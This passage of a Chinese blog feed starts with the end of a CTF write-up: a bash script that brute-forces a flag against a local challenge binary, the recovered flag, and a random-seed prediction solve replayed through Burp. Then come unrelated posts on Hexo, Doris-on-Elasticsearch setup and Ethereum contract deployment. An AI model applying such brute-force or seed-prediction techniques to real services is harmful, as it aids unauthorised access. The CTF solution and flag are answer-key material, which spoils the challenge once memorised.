i&lt;<span class="number">42</span>; i+=<span class="number">3</span>)); <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 第一个字符</span></span><br><span class="line">    max_string_first_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">    max_result_first_round=<span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">    break_all=0</span><br><span class="line">    <span class="keyword">for</span> ((j=<span class="number">0</span>; j&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; j++)); <span class="keyword">do</span></span><br><span class="line">        new_string_first_round=<span class="string">&quot;<span class="variable">$&#123;max_string_first_round:0:i&#125;</span><span class="variable">$&#123;all_chars[j]&#125;</span><span class="variable">$&#123;input_string:i+1&#125;</span>&quot;</span></span><br><span class="line">        result_first_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_first_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">        matched_first_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_first_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_first_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_result_first_round</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            max_matched=<span class="string">&quot;<span class="variable">$matched_first_round</span>&quot;</span></span><br><span class="line">            max_matched_string=<span class="string">&quot;<span class="variable">$new_string_first_round</span>&quot;</span></span><br><span class="line">            max_string_second_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">            <span class="comment"># 第二个字符</span></span><br><span class="line">            <span class="keyword">for</span> ((k=<span class="number">0</span>; k&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; k++)); <span class="keyword">do</span></span><br><span class="line">                new_string_second_round=<span class="string">&quot;<span class="variable">$&#123;max_string_second_round:0:i+1&#125;</span><span class="variable">$&#123;all_chars[k]&#125;</span><span class="variable">$&#123;input_string:i+2&#125;</span>&quot;</span></span><br><span class="line">                result_second_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_second_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">                matched_second_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_second_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_second_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                    max_matched=<span class="string">&quot;<span class="variable">$matched_second_round</span>&quot;</span></span><br><span class="line">                    max_matched_string=<span class="string">&quot;<span class="variable">$new_string_second_round</span>&quot;</span></span><br><span class="line">                    max_string_third_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                    <span class="comment"># 第三个字符</span></span><br><span class="line">                    <span class="keyword">for</span> ((m=<span class="number">0</span>; m&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; m++)); <span class="keyword">do</span></span><br><span class="line">                        new_string_third_round=<span class="string">&quot;<span class="variable">$&#123;max_string_third_round:0:i+2&#125;</span><span class="variable">$&#123;all_chars[m]&#125;</span><span class="variable">$&#123;input_string:i+3&#125;</span>&quot;</span></span><br><span class="line">                        result_third_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_third_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">                        matched_third_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_third_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_third_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                            max_matched=<span class="string">&quot;<span class="variable">$matched_third_round</span>&quot;</span></span><br><span class="line">                            max_matched_string=<span class="string">&quot;<span class="variable">$new_string_third_round</span>&quot;</span></span><br><span class="line">                            <span class="keyword">if</span> (( max_matched % <span class="number">4</span> == <span class="number">0</span> )); <span class="keyword">then</span></span><br><span class="line">                                break_all=1</span><br><span class="line">                                <span class="built_in">break</span></span><br><span class="line">                            <span class="keyword">fi</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                    <span class="keyword">done</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">done</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Flag is: <span class="variable">$max_matched_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>但是这样得出的 flag 还是有问题的，需要人工排查<br><code>Flag is: W4terCTF&#123;UNr31AT3D_6Yt43_00NNb3N3n1m_RAt4d&#125;</code></p>
<h3><span id="crypto">Crypto</span></h3><h4><span id="wish">Wish</span></h4><p>这个题真的搞心态呀，放在密码题，但是并不是密码题做法呀</p>
<p>可以看到，这里是算抽奖概率的函数，如果“运气”足够好，那就能直接返回flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish1.png" class>

<p>为什么要说是“运气”呢？仔细看第一行，random是设定seed的，也就是说，每一次抽奖，假如seed确定，结果也是确定的；而且index的值决定了for循环的次数<br>seed是由time决定的，time的范围可以从下面得到：</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish2.png" class>

<p>也就是0到86399<br>所以，写一个python代码，遍历0到86399的seed，看哪一个的算出 abs(random.randint(0, 1919810) - 114514)的值小于等于1，那么 probability的值就能大于10，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">86400</span>):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    <span class="comment"># print(random.randint(0, 1919810))</span></span><br><span class="line">    temp = <span class="built_in">abs</span>(random.randint(<span class="number">0</span>, <span class="number">1919810</span>) - <span class="number">114514</span>)</span><br><span class="line">    <span class="keyword">if</span> temp &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(temp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得出结果是seed为20544，abs(random.randint(0, 1919810) - 114514)的值为1<br>也就是说，有10%的概率可以抽到，开抽！<br>通过burp设定好报文格式，保证每次的time和index是一样的，格式如下：</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish3.png" class>

<p>抽了n次之后，就发现flag了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish4.png" class>]]></content>
      <categories>
        <category>竞赛</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/23/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3><span id="run-server">Run server</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3><span id="generate-static-files">Generate static files</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>startup</category>
      </categories>
  </entry>
  <entry>
    <title>doris_on_es 配置教程</title>
    <url>/2024/05/07/doris-on-es/</url>
    <content><![CDATA[<h2><span id="项目用处">项目用处</span></h2><p>Doris通过创建外部表方式将Doris的分布式查询规划能力和ES(Elasticsearch)的全文检索能力相结合，提供更完善的 OLAP 分析场景解决方案，支持：</p>
<ul>
<li>ES 中的多index分布式Join查询</li>
<li>Doris 和 ES 中的表联合查询，更复杂的全文检索过滤</li>
</ul>
<span id="more"></span>

<h2><span id="配置过程">配置过程</span></h2><p>实验环境: doris 版本2.0.9, Elasticsearch 版本8.7.1，在 wsl2-ubuntu22.0.4 上部署</p>
<p>doris 的配置可以参考<a href="https://doris.apache.org/zh-CN/docs/1.2/get-starting/">官方文档</a>, Elasticsearch 的配置可以参考<a href="https://blog.csdn.net/qq_45702207/article/details/120594669">这篇文章</a> 只需要看 Elasticsearch 配置部分就ok了</p>
<p>对于 Elasticsearch 的配置，作者有个小技巧，就是现在本机配置好后，再把整个文件夹复制到虚拟机的 &#x2F;home&#x2F;user 目录下，如果有报错文件无法复制过去的直接跳过就好，不影响使用<br>虚拟机的目录可以通过在资源管理器地址栏中输入 \wsl.localhost\ 找到，我的是 \wsl.localhost\Ubuntu</p>
<p>配置 Elasticsearch 过程中作者遇到了没有 tools.jar 报错，需要自行下载 tools.jar，并放入安装目录 \jdk-x.x.x\lib 中</p>
<h3><span id="单节点查询">单节点查询</span></h3><h4><span id="创建doris外部表">创建doris外部表</span></h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">EXTERNAL</span> <span class="keyword">TABLE</span> `es_table` (</span><br><span class="line">    `id` long COMMENT &quot;&quot;,</span><br><span class="line">    `k1` <span class="type">bigint</span>(<span class="number">20</span>) COMMENT &quot;&quot;,</span><br><span class="line">    `k2` datetime COMMENT &quot;&quot;,</span><br><span class="line">    `k3` <span class="type">varchar</span>(<span class="number">20</span>) COMMENT &quot;&quot;,</span><br><span class="line">    `k4` <span class="type">varchar</span>(<span class="number">100</span>) COMMENT &quot;&quot;,</span><br><span class="line">    `k5` <span class="type">float</span> COMMENT &quot;&quot;</span><br><span class="line">) ENGINE<span class="operator">=</span>ELASTICSEARCH</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">RANGE</span>(`id`)</span><br><span class="line">PROPERTIES (</span><br><span class="line">    &quot;connector&quot; <span class="operator">=</span> &quot;elasticsearch&quot;,</span><br><span class="line">    &quot;host&quot; <span class="operator">=</span> &quot;http://es_ip:es_port(一般是9200)&quot;,</span><br><span class="line">    &quot;index&quot; <span class="operator">=</span> &quot;test&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4><span id="es-创建-test-索引">ES 创建 test 索引</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X PUT &quot;http://es_ip:es_port/test&quot; -H &#x27;Content-Type: application/json&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;id&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;long&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;k1&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;long&quot;,</span><br><span class="line">        &quot;index&quot;: true</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;k3&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;text&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;k4&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;text&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;k5&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;float&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;k2&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;date&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;yyyy-MM-dd&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h4><span id="es-添加数据">ES 添加数据</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;http://es_ip:es_port/test/_doc&quot; -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;</span><br><span class="line">  &quot;id&quot;: 1001,</span><br><span class="line">  &quot;k1&quot;: 100,</span><br><span class="line">  &quot;k2&quot;: &quot;2020-01-01&quot;,</span><br><span class="line">  &quot;k3&quot;: &quot;Trying&quot;,</span><br><span class="line">  &quot;k4&quot;: &quot;Trying out Elasticsearch&quot;,</span><br><span class="line">  &quot;k5&quot;: 10</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>数据添加成功后，在mysql客户端连接doris查询ES数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> es_table;</span><br></pre></td></tr></table></figure>

<img data-src="/2024/05/07/doris-on-es/doris1.png" class>

<h4><span id="es-批量添加数据">ES 批量添加数据</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;http://es_ip:es_port/_bulk&quot; -H &#x27;Content-Type: application/json&#x27; -d &#x27;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;test&quot;&#125;&#125;</span><br><span class="line">&#123; &quot;id&quot;: &quot;1&quot;, &quot;k1&quot; : 100, &quot;k2&quot;: &quot;2020-01-01&quot;, &quot;k3&quot;: &quot;Trying out Elasticsearch&quot;, &quot;k4&quot;: &quot;Trying out Elasticsearch&quot;, &quot;k5&quot;: 10.0&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;test&quot;&#125;&#125;</span><br><span class="line">&#123; &quot;id&quot;: &quot;2&quot;, &quot;k1&quot; : 100, &quot;k2&quot;: &quot;2020-01-01&quot;, &quot;k3&quot;: &quot;Trying out Doris&quot;, &quot;k4&quot;: &quot;Trying out Doris&quot;, &quot;k5&quot;: 10.0&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;test&quot;&#125;&#125;</span><br><span class="line">&#123; &quot;id&quot;: &quot;3&quot;, &quot;k1&quot; : 100, &quot;k2&quot;: &quot;2020-01-01&quot;, &quot;k3&quot;: &quot;Doris On ES&quot;, &quot;k4&quot;: &quot;Doris On ES&quot;, &quot;k5&quot;: 10.0&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;test&quot;&#125;&#125;</span><br><span class="line">&#123; &quot;id&quot;: &quot;4&quot;, &quot;k1&quot; : 100, &quot;k2&quot;: &quot;2020-01-01&quot;, &quot;k3&quot;: &quot;Doris&quot;, &quot;k4&quot;: &quot;Doris&quot;, &quot;k5&quot;: 10.0&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;test&quot;&#125;&#125;</span><br><span class="line">&#123; &quot;id&quot;: &quot;5&quot;, &quot;k1&quot; : 100, &quot;k2&quot;: &quot;2020-01-01&quot;, &quot;k3&quot;: &quot;ES&quot;, &quot;k4&quot;: &quot;ES&quot;, &quot;k5&quot;: 10.0&#125;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure>

<p>数据添加成功后，在mysql客户端连接doris查询ES数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> es_table;</span><br></pre></td></tr></table></figure>

<img data-src="/2024/05/07/doris-on-es/doris2.png" class>

<p>在doris中执行模糊匹配查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> es_table <span class="keyword">where</span> esquery(k4, <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;match&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;k4&quot;: &quot;elasticsearch&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &#125;&#x27;</span>);</span><br><span class="line"># 要自己处理一下换行</span><br></pre></td></tr></table></figure>

<img data-src="/2024/05/07/doris-on-es/doris3.png" class>

<h2><span id="预期应用">预期应用</span></h2><p>doris 和 ES 都是作者实训课程中所开发项目的其中一部分，但是作者并未学会如何应用到项目中，本文只是一次调研</p>
]]></content>
      <categories>
        <category>学习</category>
        <category>综合实训</category>
      </categories>
  </entry>
  <entry>
    <title>以太坊私链部署智能合约</title>
    <url>/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<h2><span id="编写智能合约">编写智能合约</span></h2><p>以下编写了一个简单的存储智能合约，不是 <em>NFT</em> 智能合约。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line"></span><br><span class="line">    function set(uint x) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add(uint x) public &#123;</span><br><span class="line">        uint y = x + storedData;</span><br><span class="line">        storedData = y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="编译智能合约">编译智能合约</span></h2><p>在 <em>Remix</em> 上compile刚刚写好的智能合约，然后会出现以下界面，ABI 和 Bytecode 待会需要用到  </p>
<img data-src="/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image.png" class>

<h2><span id="部署智能合约">部署智能合约</span></h2><p>这里实现两种部署智能合约的方式，一种是在 geth 控制台部署，一种是使用 Go 实现</p>
<h3><span id="geth-控制台部署">geth 控制台部署</span></h3><p>1、解锁账户<br>24-4-15 更新: personal.unlockAccount 被弃用，且新方法不需要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">personal.unlockAccount(eth.coinbase)</span><br></pre></td></tr></table></figure>

<p>2、录入智能合约的 bytecode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var code = &quot;0x&quot; +  &quot;608060405234801561001057600080fd5b50610218806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80631003e2d21461004657806360fe47b1146100625780636d4ce63c1461007e575b600080fd5b610060600480360381019061005b9190610106565b61009c565b005b61007c60048036038101906100779190610106565b6100b8565b005b6100866100c2565b6040516100939190610142565b60405180910390f35b60008054826100ab919061018c565b9050806000819055505050565b8060008190555050565b60008054905090565b600080fd5b6000819050919050565b6100e3816100d0565b81146100ee57600080fd5b50565b600081359050610100816100da565b92915050565b60006020828403121561011c5761011b6100cb565b5b600061012a848285016100f1565b91505092915050565b61013c816100d0565b82525050565b60006020820190506101576000830184610133565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610197826100d0565b91506101a2836100d0565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156101d7576101d661015d565b5b82820190509291505056fea2646970667358221220cbc928270d8a2ea9cd6f6c4b97793588c6a480da09388d19c6fb1f05d75e718464736f6c634300080f0033&quot;</span><br></pre></td></tr></table></figure>

<p>3、录入智能合约的 ABI<br>ABI 需要先经过压缩转义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var abi=JSON.parse(&#x27;[&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;add\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;get\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;set\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;]&#x27;)</span><br></pre></td></tr></table></figure>

<p>4、部署智能合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var gas = eth.estimateGas(&#123;data: code&#125;) //先估算需要多大的gas</span><br><span class="line">//创建智能合约类</span><br><span class="line">var myContract = eth.contract(abi)</span><br><span class="line">//创建部署智能合约的交易</span><br><span class="line">var deploymentTx = &#123;from: &#x27;0x890fb1799fe7fa4b8e01ccf343e088d946fcd556&#x27;, data: code, gas: gas&#125;;</span><br><span class="line">//创建合约实例</span><br><span class="line">var myContractInstance = myContract.new(deploymentTx)</span><br></pre></td></tr></table></figure>
<p>创建成功后，控制台中会出现以下提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO [04-15|11:43:39.794] Submitted contract creation              hash=0xf2503d2c684283a9afb6ab47233a4f2fb01f156135c429586b924a0756d0a8d8 from=0x890fb1799Fe7fA4b8E01Ccf343e088D946fCd556 nonce=1 contract=0xa5D8278723e8808151c2066198619fc02818b526 value=0</span><br></pre></td></tr></table></figure>

<p>在控制台输入 myContractInstance，能获得以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  abi: [&#123;</span><br><span class="line">      inputs: [&#123;...&#125;],</span><br><span class="line">      name: &quot;add&quot;,</span><br><span class="line">      outputs: [],</span><br><span class="line">      stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">      inputs: [],</span><br><span class="line">      name: &quot;get&quot;,</span><br><span class="line">      outputs: [&#123;...&#125;],</span><br><span class="line">      stateMutability: &quot;view&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">      inputs: [&#123;...&#125;],</span><br><span class="line">      name: &quot;set&quot;,</span><br><span class="line">      outputs: [],</span><br><span class="line">      stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  address: undefined,</span><br><span class="line">  transactionHash: &quot;0x727fb18ce42f5f368a349908eee34eb36ae1e3c7fd2cb4f280db8b0ed44de6de&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>24-4-10 更新: 在输入第一行命令的时候，发现报以下错误。原因: PUSH0 opcode 是在 solidity 0.8.20 被引入的，而私链由于还未到 Shanghai 硬分叉，此时还不支持 PUSH0 opcode</p>
<img data-src="/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/bug1.png" class>

<p>5、启动节点挖矿<br>因为在私链上没有其他节点挖矿，而部署智能合约也是一笔交易，所以需要节点挖矿使这笔交易打包上链，智能合约才部署成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">miner.start()</span><br><span class="line">miner.stop()</span><br></pre></td></tr></table></figure>

<p>6、调用智能合约<br>第一种调用用于需要花费 gas 的函数，第二种则用于不需要花费 gas 的函数，第一种调用由于也是一笔交易，所以需要节点挖矿上链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.function_name.sendTransaction(&quot;parameter_1&quot;,&quot;parameter_2&quot;,&#123;from:&quot;account_address&quot;&#125;)</span><br><span class="line">contract.function_name.call(&quot;parameter_1&quot;,&quot;parameter_2&quot;)</span><br></pre></td></tr></table></figure>

<h3><span id="使用-go-部署">使用 Go 部署</span></h3><p>这里想要实现的效果是，每次新创建一个账户的时候，都会自动部署该智能合约，这一功能用 Go 实现。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;math/big&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/accounts/abi&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/accounts/abi/bind&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/common&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/crypto&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将智能合约的ABI复制到这里，需要先经过压缩转义</span></span><br><span class="line"><span class="keyword">var</span> contractABI = <span class="string">&quot;</span></span><br><span class="line"><span class="string">[&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;add\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;get\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;set\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Geth 节点的 HTTP-RPC 地址</span></span><br><span class="line">    rpcURL := <span class="string">&quot;http://localhost:8545&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新账户的密码</span></span><br><span class="line">    newPassword := <span class="string">&quot;your_password&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 JSON-RPC 请求体，创建新账户</span></span><br><span class="line">    payload := strings.NewReader(<span 